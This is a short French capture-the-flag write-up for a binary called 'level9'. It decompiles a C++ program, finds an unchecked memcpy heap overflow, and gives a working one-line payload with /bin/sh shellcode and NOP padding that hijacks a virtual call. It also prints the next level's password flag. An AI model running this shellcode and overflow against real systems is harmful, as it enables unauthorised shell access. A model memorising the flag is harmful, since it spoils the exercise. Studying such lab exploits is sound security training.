# Level9

## Analyse du binaire

Le programme est écrit en C++ et :

- Prend un argument en ligne de commande
- Alloue deux objets de 108 bytes (0x6C) chacun
- Copie l'argument dans le premier objet à offset 4
- Fait un appel de fonction qui utilise le deuxième objet

```c
int main(int argc, const char **argv)
{
  if (argc <= 1)
    _exit(1);
  N *v3 = (N *)operator new(0x6Cu);    // Premier objet
  N::N(v3, 5);
  N *v4 = (N *)operator new(0x6Cu);    // Deuxième objet
  N::N(v4, 6);
  N::setAnnotation(v3, argv[1]);       // Copie notre input
  return (**(int (__cdecl ***)(N *, N *))v4)(v4, v3);
}

void *N::setAnnotation(N *this, char *s)
{
  size_t v2 = strlen(s);
  return memcpy((char *)this + 4, s, v2);  // Pas de vérification de taille !
}
```

## Vulnérabilité

La fonction `setAnnotation` est vulnérable car :

- Elle utilise `memcpy` sans vérifier la taille
- On peut donc appliquer un buffer overflow


## Exploitation

1. Structure de l'exploit :

- On place un shellcode au début de notre buffer
- On remplit l'espace avec des NOPs
- On écrase les données du deuxième objet avec l'adresse de notre shellcode

2. Construction du payload :

```bash
./level9 $(python -c 'print "\x0c\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90" * 83 + "\x0c\xa0\x04\x08"')
```

Détail du payload :

- `\x0c\xa0\x04\x08` : Adresse où notre shellcode sera copié (premier objet + 4)
- `\x6a\x0b\x58...` : Shellcode qui exécute /bin/sh (21 bytes)
- `\x90` \* 83 : Remplissage avec des NOPs
- `\x0c\xa0\x04\x08` : Adresse de notre shellcode

Quand le programme fait son appel de fonction final, il va sauter sur notre shellcode qui nous donnera un shell.

## Flag

```
cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
